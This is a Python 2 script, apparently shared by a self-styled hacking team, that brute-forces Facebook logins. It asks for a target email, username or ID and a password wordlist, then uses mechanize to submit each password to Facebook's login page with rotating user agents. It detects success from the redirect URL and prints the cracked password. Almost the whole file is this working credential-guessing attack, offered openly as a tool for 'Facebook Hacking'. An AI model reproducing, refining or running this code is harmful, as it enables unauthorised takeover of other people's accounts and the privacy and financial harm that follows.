#!usr
# -*- coding: UTF-8 -*-
# mod by: Dark Revel Rakib_vau
# team: Black Whale Cyber Source Team


import os
import sys
import time
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
os.system('clear')
def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 100)

runntxt(GL+'           Welcome To Myanmar')
def banner():
    os.system('clear')
    os.system('cowsay -f ghostbusters.cow HELLO | lolcat -a -d 5')
    print("\033[31;1m                       Facebook Hacking ")
    time.sleep(1.5) 
banner()

print wd+"                https://github.com/aungmoemyint404 "
print GG+"                ╔═════════════════════════════╗"
print GG+"                ╬\033[94;1mPhoneNumber\033[39;1m╱\033[94;1mEmail\033[39;1m╱\033[94;1mUsername\033[39;1m╱\033[94;1mId\033[32;1m╬ "
print GG+"                ║"
email_target = str(raw_input(GL+"\033[92m                ╚═════➤❪\033[93m "))
print GG+"                ╬══════(\033[94;1mpassword.txt\033[32;1m)═════════╝"
print GG+"                ║"
password_list = str(raw_input(GG+"                ╚═════➤❪\033[93m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]


os.system('clear')


def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb lagi..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."
                    sys.exit()
                else:
                    print RR+"Pilih yang bener cuk..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"Keluar Dari Program..."
                sys.exit()

        else:
                print RR+"Pilih yg bener cuk..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" wordlist tidak ada yg cocok..."
        print " "
	

def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Cracking ==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        os.system('clear')
                        print ('                 ┏━╱▔▔╲━━━━━━━━━┓')
                        print ('                 ┃╭▏▕▍▍▏┈┈╭━━━━╮┃')
                        print ('                 ┃╰▏╭╰╮▏┈┈┃▍▍┃┈┃┃')
                        print ('                 ┃┈▏┳╰╯▏▆▔▔▔╲┃┈┣┃')
                        print ('                 ┃┈▏╰━╯▏┣━━╯╱╰━╯┃')
                        print ('                 ┃▔╲╰╯╱▔╰━━━╮┈┈┈┃')
                        print ('                 ┗━━━━━━#Brute  ┛')
                        print " "
			print ("\033[96m            Congratulation You are Success")
			print "P A S S W O R D C R E C K I N G S U C C E S S F U L😍 "
                 	print RR+"+----------------------------------------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(WW+"Log in This account in Id code and Password ...")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = GG+"""

                       ╭━━╮┈┈┈╭━━╮┈┈┈┈┈
                       ┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
                       ╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
                       ┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
                       ┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
                       ╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
                       ┃┈┈╰━━━╯┈┈╰━┛┈┃┈
       \033[35;1m               ╔╦═╦╗╔══╗╔══╗╔══╗
                      ║║║║║║╔╗║╚║║╝╚╗╔╝
                      ║║║║║║╠╣║╔║║╗─║║─
                      ╚═╩═╝╚╝╚╝╚══╝─╚╝─
                      ─────────────────
        \033[36;1,             ✙ C R E C K I N G ✙
         """
         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print wd+"            [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print wd+"            [#] JUmlah Password saat ini\033[97;1m:", len(nuub),'password'
         print wd+"            [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

raw_input("\n\033[1;96m[\033[1;97mStart Hacking Ender\033[1;96m]")
print ("Black Whale cyber Sourse Team, We make a system & breck any system")
print ("Founder-Anirban Sumon, CEO-Dark Revel, Chairman-Black Shadow")
raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")


if __name__=='__main__':
	main()	
